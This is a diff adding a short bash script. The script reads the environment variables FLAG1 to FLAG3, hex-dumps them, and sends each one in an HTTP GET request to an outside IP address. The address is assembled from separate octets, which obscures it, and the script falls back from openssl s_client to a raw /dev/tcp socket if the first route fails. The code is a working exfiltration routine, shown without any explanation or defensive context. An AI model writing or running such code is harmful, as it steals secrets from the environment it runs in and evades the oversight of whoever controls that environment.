@@ -1,0 +1,18 @@
+#!/usr/bin/env bash
+h=$(printf '%d.%d.%d.%d' 8 217 202 186)
+for i in 1 2 3; do
+  eval v=\$FLAG$i
+  printf 'O%s ' "$i"
+  printf '%s' "$v" | xxd -p -c1 | paste -sd: -
+  echo
+  {
+    printf 'GET /zillwc/%s HTTP/1.0\r\nHost: %s\r\n\r\n' "$v" "$h"
+    sleep 1
+  } | openssl s_client -connect "${h}:80" -quiet 2>/dev/null || \
+  {
+    exec 3<>"/dev/tcp/${h}/80"
+    printf 'GET /zillwc/%s HTTP/1.0\r\nHost: %s\r\n\r\n' "$v" "$h" >&3
+    cat <&3 >/dev/null || true
+    exec 3<&- 3>&- || true
+  }
+done
